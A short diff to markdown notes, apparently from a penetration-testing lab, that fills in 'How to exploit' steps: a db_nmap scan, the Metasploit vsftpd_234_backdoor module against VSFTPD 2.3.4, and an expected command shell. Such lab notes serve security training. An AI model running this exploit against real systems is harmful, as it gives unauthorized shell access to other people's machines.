@@ -8,4 +8,11 @@
 
 ### How to exploit ?
 
-1. 
+1. Perform a scan with `db_nmap`.
+
+2. Exploiting `VSFTPD V2.3.4` to execute backdoor commands.
+```
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+3. Initially we'll get a command shell session
